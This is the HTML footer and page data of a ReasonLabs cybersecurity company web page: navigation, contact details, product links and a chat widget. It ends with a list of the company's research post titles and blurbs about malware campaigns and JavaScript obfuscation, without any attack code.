loading="lazy"/></noscript></span></a></div><div class="Footer_Footer-SocialButtons__TYaUA"><a class="Button_ButtonDefault__FgaZU Button_ButtonDefault_social_fb__smpRM Button_ButtonDefault_view_social__lxCnS" href="https://www.facebook.com/ReasonLabsCyberSec"></a><a class="Button_ButtonDefault__FgaZU Button_ButtonDefault_social_linkedin__U2_5h Button_ButtonDefault_view_social__lxCnS" href="https://www.linkedin.com/company/6428902"></a><a class="Button_ButtonDefault__FgaZU Button_ButtonDefault_social_twitter__zh7LB Button_ButtonDefault_view_social__lxCnS" href="https://twitter.com/Reasonsecurity"></a><a class="Button_ButtonDefault__FgaZU Button_ButtonDefault_social_youtube__JnOa4 Button_ButtonDefault_view_social__lxCnS" href="https://www.youtube.com/c/Reasoncoresecurity"></a></div><span class="Footer_Footer-Item__QzrND"><a href="tel: +19893000998">+1 (989) 300-0998</a></span><span class="Footer_Footer-Item__QzrND"><a href="mailto: support@reasonlabs.com">support@reasonlabs.com</a></span></div><div class="Footer_Footer-SiteMap__2t_dV"><div class="SiteMap_SiteMap__UaCV1"><div class="SiteMap_SiteMap-Block__4NSjO SiteMap_SiteMap-Block_isClosed__kgL6_"><div class="SiteMap_SiteMap-Header__XxAOC h1_footer">Company<!-- --> <div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2712%27%20height=%277%27/%3e"/></span><img alt="arrow" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="arrow" srcSet="/_next/static/media/arrow.60f6fd8e.svg 1x, /_next/static/media/arrow.60f6fd8e.svg 2x" src="/_next/static/media/arrow.60f6fd8e.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div></div><div class="SiteMap_SiteMap-Links__q68iG"><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/company">Who We Are</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/why">Why ReasonLabs?</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/packages/essential">Platform</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/events">Events</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/industry-recognition">Industry Recognition</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/career">Careers</a></span></div></div><div class="SiteMap_SiteMap-Block__4NSjO SiteMap_SiteMap-Block_isClosed__kgL6_"><div class="SiteMap_SiteMap-Header__XxAOC h1_footer">Resources<!-- --> <div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2712%27%20height=%277%27/%3e"/></span><img alt="arrow" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="arrow" srcSet="/_next/static/media/arrow.60f6fd8e.svg 1x, /_next/static/media/arrow.60f6fd8e.svg 2x" src="/_next/static/media/arrow.60f6fd8e.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div></div><div class="SiteMap_SiteMap-Links__q68iG"><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/blog">Blog</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/threat-intelligence">Labs</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="https://cyberpedia.reasonlabs.com/">Cyberpedia</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/research">Reports</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/news">News</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/faq">FAQ’s</a></span></div></div><div class="SiteMap_SiteMap-Block__4NSjO SiteMap_SiteMap-Block_isClosed__kgL6_"><div class="SiteMap_SiteMap-Header__XxAOC h1_footer">Products<!-- --> <div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2712%27%20height=%277%27/%3e"/></span><img alt="arrow" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="arrow" srcSet="/_next/static/media/arrow.60f6fd8e.svg 1x, /_next/static/media/arrow.60f6fd8e.svg 2x" src="/_next/static/media/arrow.60f6fd8e.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div></div><div class="SiteMap_SiteMap-Links__q68iG"><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/products/endpoint-protection">RAV Endpoint Protection</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/products/safer-web">Safer Web DNS Filtering</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/products/vpn">RAV VPN</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/products/edr">RAV Managed EDR</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="/platform/products/online-security">Online Security</a></span><span class="SiteMap_SiteMap-Item__4XQQ3"><a href="https://familykeeper.reasonlabs.com/">FamilyKeeper</a></span></div></div><div class="SiteMap_SiteMap-Block__4NSjO SiteMap_SiteMap-Subscribe__SUyKC" id="subscribe"></div></div></div><div class="Footer_Footer-Basement__BS9rl"><div class="Basement_Basement__CRFwT"><span class="Basement-Copyright">© <!-- -->2024<!-- --> Reason Cybersecurity Ltd.</span><div class="Basement_Basement-Laws__hGkw6"><span style="order:2"><a href="/policies">Product Policies</a></span><span style="order:1"><a href="/eula">Privacy Policy</a></span><span style="order:3"><a href="/terms-conditions">Terms &amp; Conditions</a></span></div></div></div></div></div><div class="WebChat_WebChat-Popup__5uN2S"><div class="WebChat_WebChat-Widget__OELma"><div class="WebChat_WebChat-Topbar__mRM7v"><button type="button"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2720%27%20height=%2725%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" srcSet="/_next/static/media/minimize.4207353e.svg 1x, /_next/static/media/minimize.4207353e.svg 2x" src="/_next/static/media/minimize.4207353e.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></button></div><iframe class="WebChat_WebChat-Iframe__Qad3E" src="/chat" scrolling="no"></iframe></div><div class="WebChat_WebChat-Launcher__bAX6l"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2769%27%20height=%2769%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" srcSet="/_next/static/media/badge.5cc43f89.svg 1x, /_next/static/media/badge.5cc43f89.svg 2x" src="/_next/static/media/badge.5cc43f89.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"userData":{"relatedResearches":{"latest":[{"id":1,"title":"COVID-19, Info Stealer \u0026 the Map of Threats; Threat Analysis Report","date":"Mar 9, 2020","text":"ReasonLabs Researchers have identified a malware campaign using a “Coronavirus map” to spread the Info Stealer known as AZORult.","link":"/blog/covid-19-info-stealer-the-map-of-threats-threat-analysis-report","slug":"covid-19-info-stealer-the-map-of-threats-threat-analysis-report","thumbnail":"/images/articles/thumbnails/covid-19-threat-analysis-report.svg"},{"id":2,"title":"Dealing with JavaScript Obfuscations — Part 1","date":"May 27, 2020","text":"Using JavaScript in cyber attacks is not exactly new, but more and more attackers are using Javascript to create malware…","link":"/research/dealing-with-javascript-obfuscations-part-1","slug":"dealing-with-javascript-obfuscations-part-1","thumbnail":"/images/articles/thumbnails/js-obfuscation-1.svg"},{"id":3,"title":"Dealing with JavaScript Obfuscations — Part 2","date":"June 1, 2020","text":"Attackers want to make things harder in case we beautify the code, so for that, they’ll add some garbage code. Garbage code has no real purpose; it doesn’t affect the code itself in any way. The whole idea of garbage code is just to make things harder to track and to confuse the researcher.","link":"/research/dealing-with-javascript-obfuscations-part-2","slug":"dealing-with-javascript-obfuscations-part-2","thumbnail":"/images/articles/thumbnails/js-obfuscation-2.svg"}],"more":[{"id":21,"title":"2024 Consumer Cybersecurity Pulse Report","date":"Tue Sept 24 2024","text":"ReasonLabs commissioned a consumer survey to find out what Americans are experiencing online","link":"/blog/2024-consumer-cybersecurity-pulse-report","slug":"2024-consumer-cybersecurity-pulse-report","thumbnail":"/images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg"}]}}},"__N_SSG":true},"page":"/research/new-widespread-extension-trojan-malware-campaign","query":{},"buildId":"RMNDSA0HHKUp7oF5aoC_H","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>